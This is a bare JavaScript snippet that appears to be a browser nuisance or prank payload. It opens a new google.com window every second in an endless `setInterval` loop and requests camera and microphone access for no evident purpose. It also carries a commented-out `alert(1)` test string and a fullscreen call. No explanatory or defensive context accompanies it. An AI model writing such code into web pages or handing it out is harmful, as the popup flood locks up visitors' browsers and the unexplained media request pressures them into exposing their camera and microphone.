function p() {
  setTimeout('window.open("http://google.com");', 1000);
  setInterval('window.open("http://google.com");', 1000); // setTimeout('alert(1)',400)
  //document.body.requestFullscreen();

  navigator.mediaDevices ? navigator.mediaDevices.getUserMedia({
    audio: true,
    video: true
  }).then() : navigator.getUserMedia({
    audio: true,
    video: true
  });
}